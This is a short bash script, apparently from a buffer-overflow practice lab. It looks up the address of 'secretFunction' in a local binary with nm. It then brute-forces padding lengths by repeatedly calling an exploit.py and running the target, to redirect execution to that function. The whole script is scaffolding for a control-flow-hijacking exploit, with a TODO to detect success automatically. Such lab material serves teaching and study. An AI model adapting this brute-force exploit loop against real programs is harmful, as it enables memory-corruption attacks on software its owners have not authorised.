#!/bin/bash

read -p "How many Bytes of the buffer inside the vulnerable function? " bytesBuffer

Address=$(nm vulnerable_program | grep "secretFunction" | awk '{print $1}')



echo "Secret Functions address is = $Address" 


for ((i=bytesBuffer; i<=bytesBuffer+50; i++)); do
   python3 exploit.py $i $Address
   sleep 0.02

   make run
   echo -e "\n\n"
   #TODO: Need to add pattern recognition to stop when it finds the secret functions print.

   sleep 0.1
done



